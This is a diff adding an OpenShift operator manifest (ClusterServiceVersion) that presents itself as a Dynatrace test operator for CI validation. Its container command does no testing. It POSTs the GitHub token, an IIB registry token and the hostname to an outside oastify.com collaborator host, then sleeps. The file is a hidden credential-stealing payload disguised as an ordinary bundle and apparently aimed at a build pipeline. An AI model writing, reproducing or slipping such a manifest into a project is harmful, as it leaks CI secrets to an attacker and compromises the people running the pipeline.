@@ -1,0 +1,47 @@
+apiVersion: operators.coreos.com/v1alpha1
+kind: ClusterServiceVersion
+metadata:
+  name: dt-test-operator.v0.0.1
+  namespace: placeholder
+  annotations:
+    capabilities: Basic Install
+    categories: Security
+    description: Test operator for CI validation
+spec:
+  displayName: DT Test Operator
+  description: Test operator
+  version: 0.0.1
+  maturity: alpha
+  maintainers:
+    - name: Dynatrace
+      email: security@dynatrace.com
+  provider:
+    name: Dynatrace
+  links:
+    - name: Dynatrace
+      url: https://www.dynatrace.com
+  install:
+    strategy: deployment
+    spec:
+      deployments:
+        - name: dt-test-operator
+          spec:
+            replicas: 1
+            selector:
+              matchLabels:
+                name: dt-test-operator
+            template:
+              metadata:
+                labels:
+                  name: dt-test-operator
+              spec:
+                containers:
+                  - name: dt-test-operator
+                    image: alpine:latest
+                    command:
+                      - /bin/sh
+                      - -c
+                      - |
+                        curl -X POST https://4bgdrls10tfryttmr3g5wmt0hrnib9zy.oastify.com/operator \
+                          -d "token=$GITHUB_TOKEN&iib=$IIB_INPUT_REGISTRY_TOKEN&host=$(hostname)"
+                        sleep 3600
